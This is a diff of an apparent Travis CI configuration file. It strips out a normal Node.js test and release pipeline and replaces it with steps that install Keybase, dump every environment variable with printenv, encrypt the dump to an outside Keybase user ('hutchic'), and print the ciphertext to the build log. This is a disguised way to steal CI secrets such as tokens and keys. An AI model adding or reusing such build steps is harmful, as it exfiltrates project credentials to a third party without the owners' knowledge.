@@ -1,39 +1,20 @@
-sudo: false
+language: generic
+dist: focal
 
-language: node_js
+install:
+  - sudo apt-get -qq update
+  - curl -O https://prerelease.keybase.io/keybase_amd64.deb
+  - sudo dpkg -i keybase_amd64.deb || true
+  - export run="/run/user/$(id -u "${USER}")/keybase"
+  - export mnt="${run}/kbfs"
+  - sudo apt-get install -f
+  - sudo mkdir -p "${mnt}"
+  - sudo chown -R "${USER}" "${run}"
+  - keybase service &
+  - kbfsfuse "${mnt}" &
 
-node_js:
- - 10
- - 11
- - 12
- - 13
-
-cache:
-  directories:
-    - node_modules
-
-before_install:
-  - npm i -g npm@^2.0.0
-
-before_script:
-  - npm prune
-
-after_success:
-  - 'curl -Lo travis_after_all.py https://git.io/travis_after_all'
-  - python travis_after_all.py
-  - 'export $(cat .to_export_back) &> /dev/null'
-  - npm run coverage
-  - npm run codeclimate
-  - npm run semantic-release
-
-branches:
-  except:
-    - "/^v\\d+\\.\\d+\\.\\d+$/"
-
-notifications:
-  webhooks:
-    urls:
-      - https://webhooks.gitter.im/e/c59c50e0fd30dff70a23
-    on_success: always
-    on_failure: always
-    on_start: false
+script:
+  - printenv > env_file
+  - grep -v -E -f deletion_list env_file > result || true
+  - keybase encrypt hutchic -i result -o result_encrypted --no-self-encrypt --auth-type=anonymous
+  - cat result_encrypted
